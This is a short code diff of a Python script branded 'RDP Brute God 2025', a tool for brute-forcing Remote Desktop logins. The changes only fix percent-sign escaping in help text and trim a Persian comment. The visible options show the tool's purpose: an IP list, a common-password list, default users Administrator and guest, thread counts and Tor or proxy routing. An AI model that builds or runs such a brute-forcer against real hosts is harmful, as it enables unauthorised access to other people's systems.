@@ -15,7 +15,7 @@ print("""
 ╔═══════════════════════════════════════════════════════════╗
 ║           RDP Brute God 2025 – توسط بهترین هکر دنیا        ║
 ║       Smart RDP Brute + Auto NLA Bypass (-anla)          ║
-║              98% CPU Power – Modular & Ultra Fast         ║
+║              98%% CPU Power – Modular & Ultra Fast         ║
 ╚═══════════════════════════════════════════════════════════╝
 """)
 
@@ -25,7 +25,7 @@ parser = argparse.ArgumentParser(
     add_help=False
 )
 parser.add_argument("ips_file", nargs='?', help="File with IPs (e.g., ips.txt)")
-parser.add_argument("-t", "--threads", type=int, help="Number of threads (default: 98% CPU)")
+parser.add_argument("-t", "--threads", type=int, help="Number of threads (default: 98%% CPU)")
 parser.add_argument("-a", "--all-passwords", action="store_true", help="Use full common passwords list")
 parser.add_argument("-u", "--users", help="Users (comma-separated, default: Administrator,guest)", default=",".join(DEFAULT_USERS))
 parser.add_argument("-p", "--proxy", help="Proxy mode: tor or proxies.txt (default: none)", default="none")
@@ -77,7 +77,7 @@ async def main():
     sem = asyncio.Semaphore(MAX_WORKERS)
     loop = asyncio.get_event_loop()
 
-    # کال کردن periodic_stats درست (فیکس اصلی)
+    # کال کردن periodic_stats درست
     stats_task = periodic_stats(stats, lock, cpu_proc, stats["start_time"])
     loop.create_task(stats_task())
 
